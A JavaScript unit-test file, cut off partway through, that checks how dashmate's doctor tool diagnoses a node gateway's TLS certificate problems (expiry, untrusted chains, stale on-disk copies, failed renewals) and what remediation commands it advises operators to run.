import getBaseConfigFactory from '../../../../configs/defaults/getBaseConfigFactory.js';
import analyseGatewayCertificateFactory from '../../../../src/doctor/analyse/analyseGatewayCertificateFactory.js';
import { SEVERITY } from '../../../../src/doctor/Prescription.js';
import Samples from '../../../../src/doctor/Samples.js';
import { DOCS_LINKS } from '../../../../src/docsLinks.js';

const EXTERNAL_IP = '198.51.100.7';

/**
 * @param {number} days - relative to now, negative for an expired certificate
 * @return {string}
 */
function validTo(days) {
  return new Date(Date.now() + days * 24 * 60 * 60 * 1000).toUTCString();
}

/**
 * @param {string} value
 * @return {string}
 */
function stripAnsi(value) {
  const escape = String.fromCharCode(27);

  return value.replace(new RegExp(`${escape}\\[[0-9;]*m`, 'g'), '');
}

describe('analyseGatewayCertificateFactory', () => {
  let analyseGatewayCertificate;
  let config;
  let samples;

  /**
   * @param {Object} servedCertificate
   * @return {Problem[]}
   */
  function analyse(servedCertificate) {
    samples.setServiceInfo('gateway', 'servedCertificate', servedCertificate);

    return analyseGatewayCertificate(samples);
  }

  /**
   * Record that the files on disk were judged sound, for the exact pair the
   * wire probe sampled.
   *
   * @param {string} fingerprint256
   */
  function installedIsUsable(fingerprint256) {
    samples.setServiceInfo('gateway', 'installedCertificate', {
      status: 'CHECKS_PASSED',
      reasons: [],
      warnings: [],
      fingerprint256,
    });
  }

  /**
   * @param {Object} overrides
   * @return {Object}
   */
  function served(overrides = {}) {
    return {
      state: 'served',
      port: 443,
      certificate: { fingerprint256: 'AA:BB', validTo: validTo(30) },
      chainVerified: true,
      chainError: null,
      identityVerified: true,
      identityError: null,
      matchesOnDisk: true,
      ...overrides,
    };
  }

  beforeEach(() => {
    config = getBaseConfigFactory()();

    config.set('platform.enable', true);
    config.set('externalIp', EXTERNAL_IP);

    samples = new Samples();
    samples.setDashmateConfig(config);

    analyseGatewayCertificate = analyseGatewayCertificateFactory();
  });

  it('should report nothing on a network where update does not enforce', () => {
    // A local node uses a self-signed certificate by design. Reporting it as a
    // problem tells an operator their healthy node is broken, and prescribes a
    // publicly-issued certificate for an address no authority can reach.
    config.set('network', 'local');
    config.set('platform.gateway.ssl.provider', 'self-signed');

    samples.setServiceInfo('gateway', 'installedCertificate', {
      status: 'INVALID',
      reasons: [{ code: 'SELF_SIGNED', message: 'The certificate is self-signed.' }],
      warnings: [],
      fingerprint256: 'AA:BB',
    });

    expect(analyseGatewayCertificate(samples)).to.be.empty();
  });

  it('should replace rather than reinstall a certificate issued for another address', () => {
    // Reinstalling cannot fix an address the certificate does not carry, and
    // the reuse check is weaker than this one, so an unforced command can hand
    // back the same rejected certificate.
    samples.setServiceInfo('gateway', 'installedCertificate', {
      status: 'INVALID',
      reasons: [{ code: 'IP_MISMATCH', message: 'The certificate is not valid for this address.' }],
      warnings: [],
      fingerprint256: 'AA:BB',
    });

    const [problem] = analyseGatewayCertificate(samples);

    expect(problem.getSolution()).to.include('--force');
  });

  // Nothing can be issued for an address dashmate does not have, and the
  // obtain command refuses to start without one, so advising it here sends the
  // operator to a command that fails before it does anything.
  it('should prescribe the address rather than an obtain that cannot run', () => {
    samples.setServiceInfo('gateway', 'installedCertificate', {
      status: 'INVALID',
      reasons: [{
        code: 'NO_EXTERNAL_IP',
        message: "This node's public address is not set",
      }],
      warnings: [],
      fingerprint256: 'AA:BB',
    });

    const [problem] = analyseGatewayCertificate(samples);

    const solution = problem.getSolution();

    // Obtain still belongs here - it is what the operator runs once an address
    // exists - but only after the setting that makes it able to run at all.
    expect(solution).to.include('externalIp');
    expect(solution.indexOf('externalIp')).to.be.lessThan(solution.indexOf('ssl obtain'));
  });

  it('should report no problem for a healthy certificate', () => {
    expect(analyse(served())).to.be.empty();
  });

  it('should report an expired certificate that clients cannot connect to', () => {
    const problems = analyse(served({
      certificate: { fingerprint256: 'AA:BB', validTo: validTo(-158) },
    }));

    expect(problems).to.have.lengthOf(1);
    expect(problems[0].getDescription()).to.include('expired');
    expect(problems[0].getSeverity()).to.equal(SEVERITY.HIGH);
    expect(problems[0].getSolution()).to.include('dashmate_helper');
  });

  it('should distinguish a certificate that was renewed but never reached the gateway', () => {
    // Renewed means the disk copy outlives the served one, and that it was
    // judged sound. Leaving either out let the branch claim a direction and a
    // safety it had never checked.
    installedIsUsable('CC:DD');

    const problems = analyse(served({
      certificate: { fingerprint256: 'AA:BB', validTo: validTo(-2) },
      matchesOnDisk: false,
      onDisk: { fingerprint256: 'CC:DD', validTo: validTo(30) },
    }));

    expect(problems).to.have.lengthOf(1);
    expect(problems[0].getDescription()).to.include('newer one has already been saved and is ready to use');
    expect(problems[0].getSolution()).to.include('dashmate restart --config base --platform');
  });

  it('should warn before the outage when a renewed certificate has not been picked up', () => {
    // Renewed means the disk copy outlives the served one and was judged
    // sound; together that is what makes a restart the right advice here.
    installedIsUsable('CC:DD');

    const problems = analyse(served({
      matchesOnDisk: false,
      onDisk: { fingerprint256: 'CC:DD', validTo: validTo(60) },
    }));

    expect(problems).to.have.lengthOf(1);
    expect(problems[0].getDescription()).to.include('older certificate than the one that has been saved');
    expect(problems[0].getSeverity()).to.equal(SEVERITY.HIGH);
  });

  // A restart re-reads the same bundle, so where the chain is already complete
  // and simply signed by an authority clients do not trust, it changes nothing
  // and the operator is left with no way forward.
  it('should offer a trusted certificate, not only a restart, for an untrusted chain', () => {
    const [problem] = analyse(served({
      chainVerified: false,
      chainError: 'UNABLE_TO_GET_ISSUER_CERT_LOCALLY',
    }));

    expect(problem.getSolution()).to.include('dashmate ssl obtain --config base --provider letsencrypt');
  });

  // A certificate can fail verification with a sound chain, because its dates
  // do not hold. Telling that operator the authority is untrusted is false, and
  // sends them to replace a certificate when the clock is what is wrong.
  it('should not blame the authority when the dates are what failed', () => {
    const [problem] = analyse(served({
      chainVerified: false,
      chainError: 'CERT_NOT_YET_VALID',
    }));

    expect(problem.getSolution()).to.not.include('the authority that issued it is not one');
    expect(problem.getSolution()).to.include("clock");
  });

  it('should report an untrusted certificate separately from expiry', () => {
    const problems = analyse(served({
      chainVerified: false,
      chainError: 'UNABLE_TO_VERIFY_LEAF_SIGNATURE',
    }));

    expect(problems).to.have.lengthOf(1);
    expect(problems[0].getDescription()).to.include('not trusted by ordinary clients');

    // The raw verification code is what an operator cannot read, so it is
    // translated rather than printed.
    expect(problems[0].getDescription()).to.not.include('UNABLE_TO_VERIFY_LEAF_SIGNATURE');
    expect(problems[0].getDescription()).to.include('only one certificate was sent');
  });

  // This code is returned for a complete, correct bundle whose root the machine
  // does not trust, as well as for one that really is missing certificates.
  // Telling the first operator their bundle is incomplete sends them to repair
  // something that is not broken.
  it('should not claim certificates are missing when the issuer is merely untrusted', () => {
    const problems = analyse(served({
      chainVerified: false,
      chainError: 'UNABLE_TO_GET_ISSUER_CERT_LOCALLY',
    }));

    const description = problems[0].getDescription();

    expect(description).to.not.match(/were not sent/);
    expect(description).to.contain('does not trust');
  });

  // Only one certificate arrived, which is established rather than guessed -
  // but why its issuer could not be found is not, so both readings are named.
  it('should name both readings when only the certificate itself was sent', () => {
    const problems = analyse(served({
      chainVerified: false,
      chainError: 'UNABLE_TO_VERIFY_LEAF_SIGNATURE',
    }));

    expect(problems[0].getDescription()).to.contain('only one certificate');
  });

  // An unrecognised code is still searchable; a vague paraphrase of it is not.
  it('should pass through a verification code it has no wording for', () => {
    const problems = analyse(served({ chainVerified: false, chainError: 'SOME_NEW_CODE' }));

    expect(problems[0].getDescription()).to.include('SOME_NEW_CODE');
  });

  it('should treat an identity mismatch as not having reached this node and stop there', () => {
    // A different node or a proxy answering on the port returns a certificate that says nothing
    // about this node, so reporting it as stale or expired would send the operator the wrong way.
    const problems = analyse(served({
      identityVerified: false,
      identityError: 'Host: 198.51.100.7 is not in the cert\'s altnames',
      matchesOnDisk: false,
      certificate: { fingerprint256: 'CC:DD', validTo: validTo(-10) },
    }));

    expect(problems).to.have.lengthOf(1);
    expect(problems[0].getDescription()).to.include('not issued for this node\'s address');
    expect(problems[0].getDescription()).to.include('198.51.100.7');

    // "altnames" is the certificate's own vocabulary, not the operator's.
    expect(problems[0].getDescription()).to.not.include('altnames');
  });

  it('should judge expiry against the time the samples were taken, not the time of analysis', () => {
    // Reports are commonly opened days after collection, and a Let's Encrypt certificate for an
    // IP address lives about six days, so judging at analysis time reports healthy nodes as dead.
    samples.date = new Date(Date.now() - 10 * 24 * 60 * 60 * 1000);

    const problems = analyse(served({
      certificate: { fingerprint256: 'AA:BB', validTo: validTo(-4) },
    }));

    expect(problems).to.be.empty();
  });

  it('should not report a closed port 80 on a node whose certificate is healthy', () => {
    // The port is only bound for the seconds a validation takes, so an external check finds it
    // closed on actively renewing nodes too. Alone it would fire far more often than it is right.
    samples.setServiceInfo('gateway', 'validationHttpPort', 'CLOSED');

    expect(analyse(served())).to.be.empty();
  });

  it('should report a gateway that does not answer TLS', () => {
    const problems = analyse({ state: 'unreachable', reason: 'ECONNREFUSED' });

    expect(problems).to.have.lengthOf(1);
    expect(problems[0].getDescription()).to.include('did not answer');
    expect(problems[0].getSeverity()).to.equal(SEVERITY.MEDIUM);
  });

  it('should report nothing when the probe was skipped', () => {
    expect(analyse({ state: 'skipped', reason: 'self-signed' })).to.be.empty();
  });

  it('should report nothing when platform is disabled', () => {
    config.set('platform.enable', false);

    expect(analyse(served({ certificate: { validTo: validTo(-100) } }))).to.be.empty();
  });

  // The branch fires on the two certificates merely differing. Asserting a
  // direction without comparing them, and then advising a restart on that
  // basis, swaps a valid served certificate for an expired one and takes a
  // working node dark - which is the outcome this whole feature exists to
  // prevent, produced by its own remediation.
  describe('when the served and on-disk certificates differ', () => {
    it('should advise a restart only when the disk copy is the newer one', () => {
      installedIsUsable('CC:DD');

      const problems = analyse(served({
        matchesOnDisk: false,
        onDisk: { fingerprint256: 'CC:DD', validTo: validTo(60) },
      }));

      const [problem] = problems.filter((p) => p.getDescription().includes('has been saved'));

      expect(problem.getDescription()).to.include('older certificate than the one that has been saved');
      expect(problem.getSolution()).to.include('dashmate restart');
    });

    it('should not advise a restart when the disk copy is the stale one', () => {
      const problems = analyse(served({
        matchesOnDisk: false,
        onDisk: { fingerprint256: 'CC:DD', validTo: validTo(-158) },
      }));

      const [problem] = problems.filter((p) => p.getDescription().includes('has been saved'));

      expect(problem.getDescription()).to.not.include('older certificate than the one that has been saved');
      expect(problem.getSolution()).to.not.match(/dashmate restart/);
    });

    it('should claim no direction when it cannot compare them', () => {
      const problems = analyse(served({ matchesOnDisk: false, onDisk: null }));

      const [problem] = problems.filter((p) => p.getDescription().includes('has been saved'));

      expect(problem.getDescription()).to.not.include('older certificate than the one that has been saved');
      expect(problem.getSolution()).to.not.match(/dashmate restart/);
    });
  });

  // The expired-served branch makes the same unchecked claim: it calls any
  // differing disk copy newer and advises a restart, so a node serving an
  // expired certificate with an equally dead one on disk is told a restart
  // will fix it.
  describe('when the served certificate has expired and the disk copy differs', () => {
    it('should advise a restart only when the disk copy really is newer', () => {
      installedIsUsable('CC:DD');

      const [problem] = analyse(served({
        certificate: { fingerprint256: 'AA:BB', validTo: validTo(-1) },
        matchesOnDisk: false,
        onDisk: { fingerprint256: 'CC:DD', validTo: validTo(30) },
      }));

      expect(problem.getDescription()).to.include('newer one has already been saved and is ready to use');
      expect(problem.getSolution()).to.include('dashmate restart');
    });

    it('should not advise a restart when the disk copy is no better', () => {
      const [problem] = analyse(served({
        certificate: { fingerprint256: 'AA:BB', validTo: validTo(-1) },
        matchesOnDisk: false,
        onDisk: { fingerprint256: 'CC:DD', validTo: validTo(-158) },
      }));

      expect(problem.getDescription()).to.not.include('newer one has already been saved and is ready to use');
      expect(problem.getSolution()).to.not.match(/dashmate restart/);
      expect(problem.getSolution()).to.include('dashmate ssl obtain');
    });

    it('should not advise a restart when there is nothing to compare', () => {
      const [problem] = analyse(served({
        certificate: { fingerprint256: 'AA:BB', validTo: validTo(-1) },
        matchesOnDisk: false,
        onDisk: null,
      }));

      expect(problem.getDescription()).to.not.include('newer one has already been saved and is ready to use');
      expect(problem.getSolution()).to.not.match(/dashmate restart/);
    });
  });

  // A verdict that is absent, merely not-invalid, or about a different pair is
  // not evidence that the file is safe to load. A report collected by an older
  // dashmate carries no verdict at all, and a renewal landing between the two
  // samples means the pair judged is not the pair measured.
  describe('when the disk copy cannot be shown to be usable', () => {
    it('should not advise a restart when nothing judged the pair', () => {
      const problems = analyse(served({
        matchesOnDisk: false,
        onDisk: { fingerprint256: 'CC:DD', validTo: validTo(60) },
      }));

      problems.forEach((problem) => {
        expect(problem.getSolution()).to.not.match(/dashmate restart/);
      });
    });

    it('should not advise a restart when the verdict only fell short of failing', () => {
      samples.setServiceInfo('gateway', 'installedCertificate', {
        status: 'WARN',
        reasons: [],
        warnings: [{ code: 'PROVIDER_MISMATCH', message: 'issuer disagrees' }],
        fingerprint256: 'CC:DD',
      });

      const problems = analyse(served({
        matchesOnDisk: false,
        onDisk: { fingerprint256: 'CC:DD', validTo: validTo(60) },
      }));

      problems.forEach((problem) => {
        expect(problem.getSolution()).to.not.match(/dashmate restart/);
      });
    });

    it('should not advise a restart when the verdict judged a different pair', () => {
      installedIsUsable('EE:FF');

      const problems = analyse(served({
        matchesOnDisk: false,
        onDisk: { fingerprint256: 'CC:DD', validTo: validTo(60) },
      }));

      problems.forEach((problem) => {
        expect(problem.getSolution()).to.not.match(/dashmate restart/);
      });
    });
  });

  // The disk copy can fail the usability gate while genuinely being the newer
  // of the two, so saying it is not newer would be a second wrong claim in
  // place of the one that was removed.
  it('should not deny the disk copy is newer when the objection is something else', () => {
    installedIsUsable('EE:FF');

    const [problem] = analyse(served({
      matchesOnDisk: false,
      onDisk: { fingerprint256: 'CC:DD', validTo: validTo(60) },
    }));

    expect(problem.getDescription()).to.not.match(/is no newer|not the newer/i);
    expect(problem.getSolution()).to.not.match(/dashmate restart/);
  });

  // This branch means the connection did not reach this node's gateway at all -
  // another config, a proxy, or a second node is answering on that port. So
  // reissuing the certificate and restarting Platform fixes nothing: the port
  // is still taken, and the operator has bought an outage for it.
  describe('when the connection did not reach this node', () => {
    const hijacked = () => served({
      identityVerified: false,
      identityError: 'Host: 198.51.100.7. is not in the cert\'s altnames',
    });

    it('should send the operator to find what is answering, not to restart', () => {
      const [problem] = analyse(hijacked());

      expect(problem.getSolution()).to.not.match(/dashmate restart/);
      expect(problem.getSolution()).to.contain('answering on port 443');
    });

    // Reissuing is only the remedy once the gateway is known to be the thing
    // answering, so it is offered on that condition rather than as the step.
    it('should offer reissuing only once the gateway is known to be answering', () => {
      const [problem] = analyse(hijacked());

      expect(problem.getSolution()).to.contain('If this node\'s gateway is answering');
      // The provider is named because obtain otherwise falls back to the
      // configured one - which on a ZeroSSL node retries the free-tier wall
      // that caused the outage, and on a file node is refused outright.
      expect(problem.getSolution())
        .to.contain('dashmate ssl obtain --config base --provider letsencrypt --force');
    });
  });

  // A later expiry says nothing about whether the disk pair can be served. The
  // sample carries only a fingerprint and a date; key pairing, address and
  // self-signature come from the installed verdict, which is collected in the
  // same run. Loading a later-expiring but unusable pair over a working one is
  // the same outage the date comparison was added to prevent.
  describe('when the disk copy is newer but not usable', () => {
    [
      ['the pair does not match its key', 'KEY_MISMATCH'],
      ['it names another address', 'IP_MISMATCH'],
    ].forEach(([name, code]) => {
      it(`should not advise a restart when ${name}`, () => {
        samples.setServiceInfo('gateway', 'installedCertificate', {
          status: 'INVALID',
          reasons: [{ code, message: 'the installed pair is unusable' }],
          warnings: [],
        });

        const problems = analyse(served({
          matchesOnDisk: false,
          onDisk: { fingerprint256: 'CC:DD', validTo: validTo(60) },
        }));

        problems.forEach((problem) => {
          expect(problem.getSolution()).to.not.match(/dashmate restart/);
        });
      });
    });

    it('should not advise a restart when the disk copy has itself expired', () => {
      const problems = analyse(served({
        certificate: { fingerprint256: 'AA:BB', validTo: validTo(-40) },
        matchesOnDisk: false,
        onDisk: { fingerprint256: 'CC:DD', validTo: validTo(-10) },
      }));

      problems.forEach((problem) => {
        expect(problem.getSolution()).to.not.match(/dashmate restart/);
      });
    });
  });

  // An external connect test measures whether something is listening, and
  // nothing listens on port 80 on a healthy node except for the seconds a
  // renewal takes. So it reports CLOSED on healthy nodes by construction, and
  // attaching it to every certificate problem sends operators to rewrite
  // firewall rules that are already correct.
  it('should not claim port 80 is unreachable from a listener probe', () => {
    samples.setServiceInfo('gateway', 'validationHttpPort', 'CLOSED');

    const problems = analyse(served({ certificate: { fingerprint256: 'AA:BB', validTo: validTo(-1) } }));

    expect(problems).to.have.length.greaterThan(0);
    problems.forEach((problem) => {
      expect(problem.getDescription()).to.not.match(/port 80 is not reachable/i);
    });
  });

  describe('the certificate on disk', () => {
    /**
     * @param {Object} installed
     * @param {Object} [servedCertificate]
     * @return {Problem[]}
     */
    function analyseInstalled(installed, servedCertificate) {
      samples.setServiceInfo('gateway', 'installedCertificate', installed);

      if (servedCertificate) {
        samples.setServiceInfo('gateway', 'servedCertificate', servedCertificate);
      }

      return analyseGatewayCertificate(samples);
    }

    // Under the documented upgrade procedure the node is stopped when the
    // certificate check fails, and a stopped gateway answers no TLS connection
    // - so the probe records nothing and every problem on disk went unreported.
    // That is exactly the node an operator has just been told to run doctor on.
    it('should report a problem for a stopped node with a broken bundle', () => {
      const problems = analyseInstalled({
        status: 'INVALID',
        reasons: [{ code: 'EXPIRED', message: 'The installed certificate expired on 2026-05-01' }],
        warnings: [],
      });

      expect(problems).to.have.lengthOf(1);
      expect(problems[0].getSeverity()).to.equal(SEVERITY.HIGH);
      expect(problems[0].getDescription()).to.include('expired on 2026-05-01');
    });

    // An operator who reads this is deciding whether to stop updating. Images
    // keep arriving whatever the certificate does, and saying so is what keeps
    // a client-reachability problem from being read as a software-delivery one.
    // Doctor collects a wire sample too, and the two can legitimately disagree:
    // a gateway running with a healthy in-memory certificate and a stale bundle
    // on disk is exactly the case this analyser exists alongside. So the
    // on-disk problem states what the files show, not what a client would do.
    it('should not state a client outcome from an on-disk check', () => {
      const [problem] = analyseInstalled({
        status: 'INVALID',
        reasons: [{ code: 'SWITCH_INCOMPLETE', message: 'a switch was interrupted' }],
        warnings: [],
      });

      expect(problem.getSolution()).to.not.match(/clients? rejects?/i);
      expect(problem.getSolution()).to.not.match(/clients (are|were|could not|cannot|unable)/i);
      expect(problem.getSolution()).to.contain('not usable');
    });

    // `dashmate ssl obtain` signals the gateway itself once it has the files,
    // so telling the operator to restart afterwards buys an outage and nothing
    // else. Restart guidance belongs on the paths where nothing else reloads.
    it('should not ask for a restart after a command that reloads by itself', () => {
      const problems = analyseInstalled({
        status: 'INVALID',
        reasons: [{ code: 'EXPIRED', message: 'expired' }],
        warnings: [{ code: 'EXPIRING_SOON', message: 'expires tomorrow' }],
      });

      expect(problems).to.have.lengthOf(2);
      problems.forEach((problem) => {
        expect(problem.getSolution()).to.contain('dashmate ssl obtain');
        expect(problem.getSolution()).to.not.match(/dashmate restart/);
      });
    });

    it('should say that updates still deliver images', () => {
      const [problem] = analyseInstalled({
        status: 'INVALID',
        reasons: [{ code: 'EXPIRED', message: 'expired' }],
        warnings: [],
      });

      expect(problem.getSolution()).to.include('Updates still work');
    });

    // Doctor is run against a named node, and a solution pasted without one
    // targets whichever config happens to be the default. For `ssl obtain`
    // that re-issues a certificate for a different node's address and rewrites
    // that node's provider - a mutation of the wrong machine.
    it('should put the node it analysed on every command it suggests', () => {
      const problems = analyseInstalled({
        status: 'INVALID',
        reasons: [{ code: 'EXPIRED', message: 'expired' }],
        warnings: [{ code: 'EXPIRING_SOON', message: 'expires tomorrow' }],
      });

      expect(problems).to.have.lengthOf(2);

      problems.forEach((problem) => {
        const commands = problem.getSolution()
          .split('\n')
          .map((line) => line.trim())
          .filter((line) => line.startsWith('dashmate '));

        expect(commands).to.have.length.greaterThan(0);
        commands.forEach((command) => {
          expect(command, command).to.contain(`--config ${config.getName()}`);
        });
      });
    });

    // Telling someone who is reading a doctor report to run doctor is circular.
    it('should not suggest running doctor as the fix for a doctor problem', () => {
      const [problem] = analyseInstalled({
        status: 'INVALID',
        reasons: [{ code: 'EXPIRED', message: 'expired' }],
        warnings: [],
      });

      expect(problem.getSolution()).to.not.match(/^\s*dashmate doctor\b/m);
    });

    it('should report each warning separately and more quietly', () => {
      const problems = analyseInstalled({
        status: 'WARN',
        reasons: [],
        warnings: [
          { code: 'EXPIRING_SOON', message: 'expires tomorrow' },
          { code: 'PROVIDER_MISMATCH', message: 'issuer disagrees' },
        ],
      });

      expect(problems).to.have.lengthOf(2);
      problems.forEach((problem) => expect(problem.getSeverity()).to.equal(SEVERITY.LOW));
    });

    it('should say nothing when the checks passed', () => {
      expect(analyseInstalled({ status: 'CHECKS_PASSED', reasons: [], warnings: [] }))
        .to.have.lengthOf(0);
    });

    it('should still analyse what the gateway serves', () => {
      const problems = analyseInstalled(
        { status: 'CHECKS_PASSED', reasons: [], warnings: [] },
        served({ certificate: { fingerprint256: 'AA:BB', validTo: validTo(-1) } }),
      );

      expect(problems).to.have.lengthOf(1);
      expect(problems[0].getDescription()).to.include('expired');
    });
  });

  describe('when the installed certificate cannot be reinstated', () => {
    // One report must not prescribe two different commands for one certificate.
    // Each remedy below is reached by a different combination of what the wire
    // serves and what is on disk, and an operator reading a forced command
    // beside an unforced one has no way to tell which one their node needs.
    const SERVED_STATES = {
      'a sound certificate': served(),
      'an expired certificate matching the disk copy': served({
        certificate: { fingerprint256: 'AA:BB', validTo: validTo(-1) },
      }),
      'an expired certificate the disk copy differs from': served({
        certificate: { fingerprint256: 'CC:DD', validTo: validTo(-1) },
        matchesOnDisk: false,
        onDisk: { fingerprint256: 'AA:BB', validTo: validTo(-5) },
      }),
      'a live certificate the disk copy differs from': served({
        matchesOnDisk: false,
        onDisk: { fingerprint256: 'EE:FF', validTo: validTo(-5) },
      }),
    };

    Object.entries(SERVED_STATES).forEach(([state, servedCertificate]) => {
      it(`should force every repair it prescribes while serving ${state}`, () => {
        // Carries a reason that reinstalling cannot fix alongside a warning:
        // a stale-address certificate that is also close to expiry is the
        // ordinary shape of the problem, not a contrived one.
        samples.setServiceInfo('gateway', 'installedCertificate', {
          status: 'INVALID',
          reasons: [{
            code: 'IP_MISMATCH',
            message: 'The certificate is not valid for this address.',
          }],
          warnings: [{
            code: 'EXPIRING_SOON',
            message: 'The installed certificate expires in less than 7 days.',
          }],
          fingerprint256: 'AA:BB',
        });

        const prescribed = analyse(servedCertificate)
          .map((problem) => problem.getSolution())
          .filter((solution) => solution.includes('ssl obtain'));

        expect(prescribed).not.to.be.empty();
        prescribed.forEach((solution) => expect(solution).to.include('--force'));
      });
    });
  });

  describe('renewal record', () => {
    const DAY_MS = 24 * 60 * 60 * 1000;

    /**
     * @param {Object} overrides
     */
    function renewalFailed(overrides = {}) {
      samples.setServiceInfo('gateway', 'certificateRenewal', {
        state: 'PRESENT',
        path: '~/.dashmate/base/platform/gateway/ssl/renewal.json',
        error: null,
        provider: 'letsencrypt',
        outcome: 'failed',
        code: 'PORT_80_UNREACHABLE',
        detail: 'acme: error: 400 :: urn:ietf:params:acme:error:connection :: timeout',
        attemptedAt: new Date(Date.now() - 30 * 60 * 1000).toISOString(),
        lastSuccessAt: new Date(Date.now() - 5 * DAY_MS).toISOString(),
        consecutiveFailures: 37,
        issuanceSpentAt: null,
        issuanceUncertainAt: null,
        gatewayReloadFailedAt: null,
        ...overrides,
      });
    }

    /**
     * @param {Object} overrides
     */
    function installedValid(overrides = {}) {
      samples.setServiceInfo('gateway', 'installedCertificate', {
        status: 'CHECKS_PASSED',
        reasons: [],
        warnings: [],
        fingerprint256: 'AA:BB',
        validTo: validTo(2),
        validFrom: new Date(Date.now() - 4 * DAY_MS).toUTCString(),
        ...overrides,
      });
    }

    beforeEach(() => {
      config.set('platform.gateway.ssl.enabled', true);
      config.set('platform.gateway.ssl.provider', 'letsencrypt');
    });

    it('should warn a node that works today and goes dark in days', () => {
      // The whole point of the record. Every other check calls this node
      // healthy - the certificate is valid and being served - and it is the
      // last certificate this node will get unless the cause is repaired.
      installedValid();
      renewalFailed();

      const problems = analyse(served());

      const renewal = problems.find((p) => p.getDescription().includes('not being renewed'));

      expect(renewal).to.exist();
      expect(renewal.getSeverity()).to.equal(SEVERITY.HIGH);
      expect(renewal.getDescription()).to.contain('could not reach this node on port 80');
    });

    it('should tell the operator when it stops working, which is the only number that matters', () => {
      installedValid({ validTo: validTo(2) });
      renewalFailed();

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getDescription())
        .to.contain(new Date(Date.now() + 2 * DAY_MS).toISOString().slice(0, 10));
    });

    // It said "do not obtain another certificate yet" and then printed the
    // command underneath. A problem that ends in a runnable command is an
    // instruction to run it, and this is the one state where running it spends
    // a second weekly certificate on a fault no certificate repairs.
    it('should not print a request beneath the sentence withholding it', () => {
      installedValid();
      renewalFailed({
        code: 'CERTIFICATE_ISSUED_NOT_SAVED',
        issuanceSpentAt: new Date(Date.now() - 60 * 60 * 1000).toISOString(),
      });

      const [renewal] = analyse(served())
        .filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.contain('Do not obtain another certificate yet');
      expect(renewal.getSolution()).to.not.contain('ssl obtain');
    });

    // A sample can say PRESENT and still not parse - a damaged archive, a
    // format from a later build, or one supplied by someone else. Checking only
    // the state left the record null with nothing marking it unreadable, and
    // the derivation then read that as "nothing recorded" and allowed a request.
    it('should withhold when a present record does not parse', () => {
      installedValid({
        status: 'INVALID',
        validTo: validTo(-1),
        reasons: [{ code: 'EXPIRED', message: 'The installed certificate expired' }],
      });
      samples.setServiceInfo('gateway', 'certificateRenewal', {
        state: 'PRESENT',
        path: '~/.dashmate/base/platform/gateway/ssl/renewal.json',
        error: null,
        // No outcome and no attemptedAt: nothing a record can be built from.
        provider: 'letsencrypt',
      });

      const problems = analyse(served());
      const solutions = problems.map((p) => p.getSolution()).join('\n');

      expect(solutions).to.not.contain('ssl obtain');
    });

    // Which of the two port-80 causes gets named comes from text the authority
    // quotes back, and it quotes whatever answered on that port. The action is
    // the same either way, but the instructions were not: one said open the
    // firewall, the other said find the proxy. Each now names the other, so a
    // misread costs a sentence rather than an afternoon.
    [
      ['an unreachable port', 'PORT_80_UNREACHABLE', 'something else is answering'],
      ['a wrong responder', 'PORT_80_WRONG_RESPONDER', 'check the port'],
    ].forEach(([name, code, alternative]) => {
      it(`should name the other possibility for ${name}`, () => {
        installedValid();
        renewalFailed({ code });

        const [renewal] = analyse(served())
          .filter((p) => p.getDescription().includes('not being renewed'));

        expect(renewal.getSolution()).to.contain(alternative);
      });
    });

    // dashmate's own check answers the same way for nothing replying and for
    // something replying wrongly, so it must not prescribe one of them.
    it('should not prescribe a firewall repair for a check that cannot tell', () => {
      installedValid();
      renewalFailed({ code: 'PORT_80_CHECK_FAILED' });

      const [renewal] = analyse(served())
        .filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.contain('Either nothing reached this node');
      expect(renewal.getSolution()).to.contain("ss -lntp");
    });

    it('should offer the check that tells an operator whether their repair worked', () => {
      // There is no other way to find out. dashmate cannot test its own
      // inbound port 80, because nothing listens there except during a
      // renewal - which is why an external port check reads closed on a
      // healthy node. Sending them away for an hour to learn whether they got
      // it right is how a node stays broken: they leave, they forget, the
      // certificate expires.
      installedValid();
      renewalFailed();

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.contain('ssl obtain');
      expect(renewal.getSolution()).to.contain('retries by itself');
    });

    it('should never claim renewal has been failing since it last succeeded', () => {
      // The record knows when renewal last worked and that everything since
      // has failed. It does not know when the failures started, and on a
      // ninety-day certificate those are months apart.
      installedValid();
      renewalFailed();

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));
      const description = stripAnsi(renewal.getDescription());
      const solution = stripAnsi(renewal.getSolution());
      const misleadingCounter = /\b37\b[^\n.]*\b(?:attempts?|failures?|failed|wake-ups?)\b/i;

      expect(solution).to.contain('Last renewed');
      expect(description).to.not.contain('failing since');
      expect(solution).to.not.contain('failing since');
      // The counter counts scheduler wake-ups, not attempts.
      expect(description).to.not.match(misleadingCounter);
      expect(solution).to.not.match(misleadingCounter);
    });

    it('should name the cause instead of sending an operator to the logs', () => {
      // The sentence this work exists to delete.
      installedValid({ status: 'INVALID', validTo: validTo(-1) });
      renewalFailed();

      const problems = analyse(served({ certificate: { fingerprint256: 'AA:BB', validTo: validTo(-1) } }));

      const expired = problems.find((p) => p.getDescription().includes('expired'));

      expect(expired.getSolution()).to.not.contain('dashmate logs');
      expect(expired.getSolution()).to.contain('port 80');
    });

    it('should still send an operator to the logs when nothing was recorded', () => {
      installedValid({ status: 'INVALID', validTo: validTo(-1) });

      const problems = analyse(served({ certificate: { fingerprint256: 'AA:BB', validTo: validTo(-1) } }));

      const expired = problems.find((p) => p.getDescription().includes('expired'));

      expect(expired.getSolution()).to.contain('dashmate logs');
    });

    it('should ignore a failure the installed certificate has already outlived', () => {
      // The operator opened port 80 and ran the obtain command. The helper
      // cannot notice - it stops watching configuration until it retries, and
      // installing a certificate changes nothing it watches - so the reader
      // has to. Reporting here would tell an operator their repair failed at
      // the exact moment they ran the command to check it.
      installedValid({ validFrom: new Date().toUTCString() });
      renewalFailed({ attemptedAt: new Date(Date.now() - DAY_MS).toISOString() });

      const problems = analyse(served());

      expect(problems.filter((p) => p.getDescription().includes('not being renewed'))).to.have.lengthOf(0);
    });

    it('should ignore a record left behind by the previous provider', () => {
      installedValid();
      renewalFailed({ provider: 'zerossl' });

      const problems = analyse(served());

      expect(problems.filter((p) => p.getDescription().includes('not being renewed'))).to.have.lengthOf(0);
    });

    it('should say nothing when renewal is not dashmate\'s to do', () => {
